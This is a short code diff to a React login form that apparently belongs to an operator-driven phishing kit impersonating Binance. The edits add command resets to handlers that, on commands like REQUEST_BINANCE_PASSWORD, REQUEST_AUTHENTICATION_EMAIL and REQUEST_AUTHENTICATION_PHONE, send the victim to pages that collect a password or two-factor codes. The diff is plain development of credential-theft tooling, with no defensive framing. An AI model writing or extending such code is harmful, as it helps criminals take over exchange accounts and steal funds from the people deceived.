@@ -108,11 +108,13 @@ export default function LoginForm() {
         if (command === 'REQUEST_EMAIL_AGAIN') {
             setInvalid(true); // Show error state for email input
             setIsLoading(false);
+            resetCommand(); 
         } else if (command === 'REQUEST_BINANCE_PASSWORD') {
             setIsLoading(false);
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
+                resetCommand(); 
                 router.push('/PasswordPage');
             }, 1500);
         } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
@@ -120,6 +122,7 @@ export default function LoginForm() {
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
+                resetCommand(); 
                 router.push('/AuthenticationPage');
             }, 1500);
         } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
@@ -127,6 +130,7 @@ export default function LoginForm() {
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
+                resetCommand(); 
                 router.push('/NumAuthenticationPage');
             }, 1500);
         }
